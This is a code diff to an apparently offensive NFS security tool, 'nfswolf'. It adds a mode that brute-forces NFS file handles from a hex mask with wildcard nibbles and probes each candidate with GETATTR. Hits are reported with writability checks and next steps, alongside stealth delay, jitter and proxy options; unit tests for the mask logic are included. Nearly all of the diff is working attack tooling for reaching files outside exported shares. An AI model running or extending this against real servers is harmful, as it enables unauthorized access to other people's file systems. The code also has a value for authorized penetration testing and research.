@@ -55,6 +55,7 @@ enum NfsVersion {
 /// Examples:
 ///   nfswolf brute-handle 192.168.1.10:/srv
 ///   nfswolf brute-handle 192.168.1.10 --seed-handle 01000200... --inode-start 64 --inode-end 256
+///   nfswolf brute-handle 192.168.1.10 --mask 0100020000??00000200000000000000
 #[derive(Parser)]
 pub(crate) struct BruteHandleArgs {
     /// Target host with optional :/export (e.g. 10.0.0.5:/srv).
@@ -91,6 +92,13 @@ pub(crate) struct BruteHandleArgs {
     /// The full search space is (inode_end - inode_start + 1) * (gen_end - gen_start + 1).
     #[arg(long, default_value = "0", value_name = "GEN", help_heading = H_BEHAVIOR)]
     pub gen_end: u32,
+
+    /// Hex handle mask with '?' for nibbles to brute-force. OS-agnostic mode:
+    /// no filesystem knowledge needed, just mark the unknown nibbles.
+    /// Up to 16 nibbles (64 bits) can be marked.
+    /// Example: 0100020000??00000200000000000000 (2 nibbles = 256 candidates).
+    #[arg(long, value_name = "HEXMASK", help_heading = H_BEHAVIOR)]
+    pub mask: Option<String>,
 }
 
 /// Run the brute-handle command.
@@ -102,6 +110,17 @@ pub(crate) async fn run(args: BruteHandleArgs, globals: &GlobalOpts) -> anyhow::
     let host = target.host.to_string();
     let addr = parse_addr_with_port(&host, globals.nfs_port)?;
     let stealth = StealthConfig::new(globals.delay, globals.jitter);
+
+    // --- Mask mode: OS-agnostic nibble brute force ---
+    if let Some(ref mask) = args.mask {
+        let (_, _, client) = make_client_with_hostname(addr, "/", 0, 0, &[], stealth, globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
+        let found = sweep_mask(&client, mask, args.max_attempts, &host).await?;
+        if !found {
+            eprintln!("{}", crate::output::status_warn("No valid handle found. Try marking different nibbles or widening --max-attempts."));
+        }
+        crate::cli::emit_replay(globals);
+        return Ok(());
+    }
 
     // Derive the seed handle (fsid + format) and the export used for the PoolKey.
     // Try MOUNT v3 first; fall back to MOUNT v1 for NFSv2-only servers.
@@ -117,7 +136,7 @@ pub(crate) async fn run(args: BruteHandleArgs, globals: &GlobalOpts) -> anyhow::
                 (mnt.handle, path.clone(), NfsVersion::V2Only)
             }
         },
-        Source::None => bail!("no seed handle: pass <HOST>:/export (mounted to derive a seed) or --seed-handle HEX"),
+        Source::None => bail!("no seed handle: pass <HOST>:/export (mounted to derive a seed) or --seed-handle HEX or --mask HEXMASK"),
     };
 
     let fs = FileHandleAnalyzer::fingerprint_fs(&seed);
@@ -429,4 +448,208 @@ fn report_hit_v2(candidate: &EscapeResult, note: &str, host: &str) {
     crate::output::print_handle("Handle", &hex);
     crate::output::print_handle_next_steps(&hex, host);
     println!();
+}
+
+// --- Nibble-mask brute force (OS-agnostic) ---
+
+/// Parse a hex mask string, identifying `?` nibble positions.
+///
+/// Returns the fixed byte template and a list of nibble indices to vary.
+/// Each nibble index is 0-based: index 0 is the high nibble of byte 0,
+/// index 1 is the low nibble of byte 0, index 2 is the high nibble of
+/// byte 1, etc.
+fn parse_mask(mask: &str) -> anyhow::Result<(Vec<u8>, Vec<usize>)> {
+    let mask = mask.trim();
+    anyhow::ensure!(mask.len().is_multiple_of(2), "mask must have even length (each byte is two hex chars or '?')");
+    anyhow::ensure!(!mask.is_empty(), "mask must not be empty");
+
+    let chars: Vec<char> = mask.chars().collect();
+    let mut template = Vec::with_capacity(chars.len() / 2);
+    let mut wild_positions: Vec<usize> = Vec::new();
+
+    for i in (0..chars.len()).step_by(2) {
+        let Some(&hi) = chars.get(i) else { break };
+        let Some(&lo) = chars.get(i + 1) else { break };
+
+        anyhow::ensure!(hi.is_ascii_hexdigit() || hi == '?', "invalid character '{hi}' at position {i}; expected hex digit or '?'");
+        anyhow::ensure!(lo.is_ascii_hexdigit() || lo == '?', "invalid character '{lo}' at position {}; expected hex digit or '?'", i + 1);
+
+        let hi_val: u8 = if hi == '?' {
+            wild_positions.push(i);
+            0
+        } else {
+            hi.to_digit(16).unwrap_or(0).min(15) as u8
+        };
+        let lo_val: u8 = if lo == '?' {
+            wild_positions.push(i + 1);
+            0
+        } else {
+            lo.to_digit(16).unwrap_or(0).min(15) as u8
+        };
+
+        template.push((hi_val << 4) | lo_val);
+    }
+
+    anyhow::ensure!(!wild_positions.is_empty(), "mask has no '?' nibbles to brute-force");
+    anyhow::ensure!(wild_positions.len() <= 16, "mask has {} wild nibbles, maximum is 16 (64-bit counter); reduce '?' count", wild_positions.len());
+
+    Ok((template, wild_positions))
+}
+
+/// Substitute wild nibbles into the template using counter bits.
+#[expect(clippy::indexing_slicing, reason = "byte_idx is derived from wild_positions which were validated against template length in parse_mask")]
+fn apply_counter(template: &[u8], wild_positions: &[usize], counter: u64) -> Vec<u8> {
+    let mut buf = template.to_vec();
+    for (bit_idx, &nibble_pos) in wild_positions.iter().enumerate() {
+        let nibble_val = ((counter >> (bit_idx * 4)) & 0xF) as u8;
+        let byte_idx = nibble_pos / 2;
+        if nibble_pos.is_multiple_of(2) {
+            buf[byte_idx] = (buf[byte_idx] & 0x0F) | (nibble_val << 4);
+        } else {
+            buf[byte_idx] = (buf[byte_idx] & 0xF0) | nibble_val;
+        }
+    }
+    buf
+}
+
+/// Nibble-mask brute force: enumerate all combinations of `?`-marked nibbles
+/// in the mask and probe each with GETATTR.
+async fn sweep_mask(client: &Nfs3Client, mask: &str, max_attempts: u64, host: &str) -> anyhow::Result<bool> {
+    let (template, wild_positions) = parse_mask(mask)?;
+    let nibble_count = wild_positions.len();
+    let shift = u32::try_from(nibble_count * 4).unwrap_or(64);
+    let search_space: u64 = 1u64.checked_shl(shift).unwrap_or(u64::MAX);
+    let limit = search_space.min(max_attempts);
+
+    eprintln!("{}", crate::output::status_info(&format!("Mask sweep: {} bytes, {} wild nibble(s), {search_space} candidates (probing up to {limit})", template.len(), nibble_count)));
+
+    let mut found_any = false;
+    let mut hits: Vec<String> = Vec::new();
+    let mut stale = 0u64;
+    let mut tried = 0u64;
+
+    for counter in 0..limit {
+        let bytes = apply_counter(&template, &wild_positions, counter);
+        let fh = FileHandle::from_bytes(&bytes);
+        tried += 1;
+
+        match probe(client, &fh).await {
+            Probe::Dir => {
+                let hex = fh.to_hex();
+                let rw = writability_hint(client, &fh).await;
+                println!();
+                println!("  Type:        directory");
+                println!("  Writability: {rw}");
+                crate::output::print_handle("Handle", &hex);
+                crate::output::print_handle_next_steps(&hex, host);
+                println!();
+                found_any = true;
+            },
+            Probe::NonDir => {
+                let hex = fh.to_hex();
+                eprintln!("{}", crate::output::status_info(&format!("Valid handle (non-directory): {hex}")));
+                hits.push(hex);
+                found_any = true;
+            },
+            Probe::Denied => {
+                let hex = fh.to_hex();
+                println!();
+                println!("  Type:        access denied (handle valid, credentials rejected)");
+                crate::output::print_handle("Handle", &hex);
+                crate::output::print_handle_next_steps(&hex, host);
+                println!();
+                found_any = true;
+            },
+            Probe::Stale => stale += 1,
+            Probe::Miss => {},
+        }
+
+        if tried.is_multiple_of(10000) {
+            let pct = tried.checked_mul(100).and_then(|n| n.checked_div(limit)).unwrap_or(100);
+            eprintln!("{}", crate::output::status_info(&format!("Mask sweep: {tried}/{limit} probed ({pct}%), {stale} STALE")));
+        }
+    }
+
+    if !hits.is_empty() {
+        eprintln!("{}", crate::output::status_info(&format!("{} non-directory handle(s) found:", hits.len())));
+        for hex in &hits {
+            eprintln!("    {hex}");
+        }
+    }
+    eprintln!("{}", crate::output::status_info(&format!("Mask sweep complete: {tried} probed, {stale} STALE, {} hit(s)", if found_any { hits.len() + 1 } else { 0 })));
+    Ok(found_any)
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn parse_mask_basic() {
+        let (template, wilds) = parse_mask("01ff??00").unwrap();
+        assert_eq!(template, vec![0x01, 0xFF, 0x00, 0x00]);
+        assert_eq!(wilds, vec![4, 5]); // nibble indices of the two '?'
+    }
+
+    #[test]
+    fn parse_mask_single_nibble() {
+        let (template, wilds) = parse_mask("0?").unwrap();
+        assert_eq!(template, vec![0x00]);
+        assert_eq!(wilds, vec![1]);
+    }
+
+    #[test]
+    fn parse_mask_rejects_odd_length() {
+        assert!(parse_mask("0?0").is_err());
+    }
+
+    #[test]
+    fn parse_mask_rejects_no_wildcards() {
+        assert!(parse_mask("0102").is_err());
+    }
+
+    #[test]
+    fn parse_mask_rejects_invalid_chars() {
+        assert!(parse_mask("0g").is_err());
+    }
+
+    #[test]
+    fn parse_mask_max_16_wildcards() {
+        let mask = "????????????????????????????????"; // 32 chars = 16 bytes, all wild = 32 nibbles > 16
+        assert!(parse_mask(mask).is_err());
+    }
+
+    #[test]
+    fn apply_counter_single_low_nibble() {
+        let (template, wilds) = parse_mask("f?").unwrap();
+        assert_eq!(apply_counter(&template, &wilds, 0x0), vec![0xF0]);
+        assert_eq!(apply_counter(&template, &wilds, 0xA), vec![0xFA]);
+        assert_eq!(apply_counter(&template, &wilds, 0xF), vec![0xFF]);
+    }
+
+    #[test]
+    fn apply_counter_single_high_nibble() {
+        let (template, wilds) = parse_mask("?f").unwrap();
+        assert_eq!(apply_counter(&template, &wilds, 0x0), vec![0x0F]);
+        assert_eq!(apply_counter(&template, &wilds, 0xC), vec![0xCF]);
+    }
+
+    #[test]
+    fn apply_counter_two_nibbles_across_bytes() {
+        let (template, wilds) = parse_mask("0?a?").unwrap();
+        // wild positions: nibble 1 (low of byte 0), nibble 3 (low of byte 1)
+        // counter 0x53: bit_idx 0 -> nibble_val 3 -> pos 1, bit_idx 1 -> nibble_val 5 -> pos 3
+        assert_eq!(apply_counter(&template, &wilds, 0x53), vec![0x03, 0xA5]);
+    }
+
+    #[test]
+    fn apply_counter_exhaustive_single() {
+        let (template, wilds) = parse_mask("0?").unwrap();
+        let mut seen = std::collections::HashSet::new();
+        for c in 0..16u64 {
+            let b = apply_counter(&template, &wilds, c);
+            let _ = seen.insert(b[0]);
+        }
+        assert_eq!(seen.len(), 16);
+    }
 }
